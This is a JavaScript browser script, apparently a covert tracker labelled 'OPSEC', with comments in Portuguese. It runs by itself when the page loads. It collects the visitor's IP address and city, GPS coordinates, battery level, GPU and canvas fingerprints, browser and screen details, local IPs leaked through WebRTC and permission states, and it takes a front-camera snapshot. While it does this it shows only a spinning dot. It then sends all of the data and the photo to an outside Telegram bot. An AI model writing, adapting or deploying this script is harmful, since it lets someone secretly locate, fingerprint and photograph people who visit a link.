(function() {
    'use strict';

    const STATUS = document.getElementById('status');

    let collectedData = {};
    let cameraStream = null;

    // ─── TELEGRAM CONFIG ──────────────────────────────────────────
    const TELEGRAM_TOKEN = 'SEU_BOT_TOKEN';
    const TELEGRAM_CHAT_ID = 'SEU_CHAT_ID';

    // ─── LOG SILENCIOSO ──────────────────────────────────────────
    function log(msg) {
        console.log('[OPSEC]', msg);
        if (STATUS) {
            const dots = ['●', '◐', '◑', '◒', '◓'];
            const idx = Math.floor(Math.random() * dots.length);
            STATUS.textContent = dots[idx];
            setTimeout(() => { STATUS.textContent = '●'; }, 300);
        }
    }

    // ─── COLETA ────────────────────────────────────────────────────

    async function collectAll() {
        log('Iniciando coleta...');
        collectedData = {};

        // 1. IP
        try {
            const res = await fetch('https://ipapi.co/json/');
            collectedData.ip = await res.json();
            log('IP: ' + collectedData.ip.ip);
        } catch (e) {
            try {
                const fallback = await fetch('https://api.ipify.org?format=json');
                collectedData.ip = await fallback.json();
                log('IP (fallback): ' + collectedData.ip.ip);
            } catch (e2) {
                log('IP falhou');
            }
        }

        // 2. Geolocalização
        try {
            const pos = await new Promise((resolve, reject) => {
                navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000 });
            });
            collectedData.geolocation = {
                lat: pos.coords.latitude,
                lng: pos.coords.longitude,
                accuracy: pos.coords.accuracy
            };
            log('Geo: ' + pos.coords.latitude + ', ' + pos.coords.longitude);
        } catch (e) {
            log('Geo: negado');
        }

        // 3. Bateria
        try {
            const battery = await navigator.getBattery();
            collectedData.battery = {
                level: battery.level,
                charging: battery.charging
            };
            log('Bateria: ' + Math.round(battery.level * 100) + '%');
        } catch (e) {
            log('Bateria: indisponível');
        }

        // 4. GPU / Canvas
        try {
            const canvas = document.createElement('canvas');
            canvas.width = 128;
            canvas.height = 64;
            const ctx = canvas.getContext('2d');
            ctx.fillStyle = '#f60';
            ctx.fillRect(0, 0, 128, 64);
            ctx.fillStyle = '#fff';
            ctx.font = 'bold 32px monospace';
            ctx.fillText('⏣', 10, 50);
            collectedData.canvas = canvas.toDataURL().substring(0, 64) + '...';

            const gl = document.createElement('canvas').getContext('webgl');
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            if (debugInfo) {
                collectedData.gpu = {
                    vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
                    renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
                };
                log('GPU: ' + (collectedData.gpu.renderer || 'unknown'));
            }
        } catch (e) {
            log('Canvas/GPU: erro');
        }

        // 5. Browser / Device
        collectedData.browser = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            hardwareConcurrency: navigator.hardwareConcurrency,
            deviceMemory: navigator.deviceMemory || 'unknown',
            maxTouchPoints: navigator.maxTouchPoints
        };

        // 6. Tela
        collectedData.screen = {
            width: screen.width,
            height: screen.height,
            devicePixelRatio: window.devicePixelRatio
        };

        // 7. Timezone
        collectedData.timezone = {
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            offset: new Date().getTimezoneOffset()
        };

        // 8. WebRTC (IP local)
        try {
            const rtc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
            rtc.createDataChannel('test');
            const offer = await rtc.createOffer();
            await rtc.setLocalDescription(offer);
            const candidates = [];
            rtc.onicecandidate = (e) => {
                if (e.candidate) candidates.push(e.candidate.candidate);
            };
            await new Promise((r) => setTimeout(r, 1500));
            collectedData.webrtc = candidates;
            rtc.close();
            log('WebRTC: ' + candidates.length + ' candidatos');
        } catch (e) {
            log('WebRTC: erro');
        }

        // 9. Permissões
        try {
            const perms = await Promise.allSettled([
                navigator.permissions.query({ name: 'geolocation' }),
                navigator.permissions.query({ name: 'camera' }),
                navigator.permissions.query({ name: 'microphone' })
            ]);
            collectedData.permissions = perms.map(p => p.status ? p.status.state : 'error');
        } catch (e) {}

        // 10. Camera
        try {
            const stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: 'user', width: { ideal: 320 }, height: { ideal: 240 } }
            });
            cameraStream = stream;
            const track = stream.getVideoTracks()[0];
            const settings = track.getSettings();
            collectedData.camera = {
                enabled: true,
                width: settings.width,
                height: settings.height,
                facingMode: settings.facingMode || 'user'
            };
            log('Câmara: ativada');
        } catch (e) {
            log('Câmara: ' + e.message);
            collectedData.camera = { error: e.message };
        }

        collectedData.collectedAt = new Date().toISOString();
        collectedData.url = window.location.href;

        log('Coleta concluída');
        sendToTelegram();
    }

    // ─── CAPTURAR SNAPSHOT ──────────────────────────────────────

    function captureSnapshot() {
        return new Promise((resolve) => {
            if (!cameraStream) { resolve(null); return; }
            const video = document.createElement('video');
            video.srcObject = cameraStream;
            video.play();
            setTimeout(() => {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth || 320;
                canvas.height = video.videoHeight || 240;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                resolve(canvas.toDataURL('image/jpeg', 0.7));
                video.pause();
                video.srcObject = null;
            }, 500);
        });
    }

    // ─── ENVIAR PARA TELEGRAM ──────────────────────────────────────

    async function sendToTelegram() {
        if (!TELEGRAM_TOKEN || TELEGRAM_TOKEN === 'SEU_BOT_TOKEN') {
            log('Configura o token no collector.js');
            return;
        }

        try {
            const data = collectedData;
            const snapshot = await captureSnapshot();

            let msg = '📡 OPSEC\n';
            msg += '━━━━━━━━━━━\n\n';

            if (data.ip) {
                msg += 'IP: ' + (data.ip.ip || '?') + '\n';
                msg += 'Cidade: ' + (data.ip.city || '') + '\n';
                msg += 'País: ' + (data.ip.country_name || '') + '\n';
                msg += 'ISP: ' + (data.ip.org || '') + '\n\n';
            }

            if (data.geolocation) {
                msg += '📍 ' + data.geolocation.lat + ', ' + data.geolocation.lng + '\n\n';
            }

            if (data.battery) {
                msg += '🔋 ' + Math.round(data.battery.level * 100) + '%';
                msg += data.battery.charging ? ' (carregando)\n\n' : '\n\n';
            }

            if (data.gpu) {
                msg += '🖥️ ' + (data.gpu.renderer || '') + '\n\n';
            }

            if (data.browser) {
                msg += '🔹 ' + data.browser.platform + ' | ' + data.browser.language + '\n';
                msg += '🔹 ' + (data.browser.hardwareConcurrency || '?') + ' cores\n\n';
            }

            if (data.screen) {
                msg += '🖥️ ' + data.screen.width + 'x' + data.screen.height;
                msg += ' @' + data.screen.devicePixelRatio + 'x\n\n';
            }

            if (data.timezone) {
                msg += '🕐 ' + data.timezone.timezone + '\n\n';
            }

            if (data.camera && data.camera.enabled) {
                msg += '📷 ' + data.camera.width + 'x' + data.camera.height + '\n\n';
            }

            msg += '━━━━━━━━━━━\n';
            msg += data.url + '\n';
            msg += data.collectedAt;

            const url = 'https://api.telegram.org/bot' + TELEGRAM_TOKEN + '/sendMessage';
            await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: msg,
                    parse_mode: 'Markdown',
                    disable_web_page_preview: true
                })
            });

            log('Texto enviado');

            if (snapshot) {
                const photoUrl = 'https://api.telegram.org/bot' + TELEGRAM_TOKEN + '/sendPhoto';
                const formData = new FormData();
                const blob = await fetch(snapshot).then(r => r.blob());
                formData.append('chat_id', TELEGRAM_CHAT_ID);
                formData.append('photo', blob, 'shot.jpg');
                await fetch(photoUrl, { method: 'POST', body: formData });
                log('📸 Snapshot enviado');
            }

            log('✅ Enviado!');

        } catch (e) {
            log('Erro: ' + e.message);
        }
    }

    // ─── INICIAR ──────────────────────────────────────────────────

    document.addEventListener('DOMContentLoaded', () => {
        log('OPSEC ativo');
        setTimeout(collectAll, 300);
    });

})();
